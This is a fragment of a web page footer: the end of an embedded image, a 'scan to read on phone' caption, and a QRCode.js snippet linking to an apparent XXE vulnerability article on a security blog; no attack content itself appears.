uL7Lun3Yx/GGfNi+/rPb+R8AAAD//yG6F3IAAAAGSURBVAMAg8R6tij6y+IAAAAASUVORK5CYII=)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/jhsoft-ContractManagement-CustomerImport-xxe.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 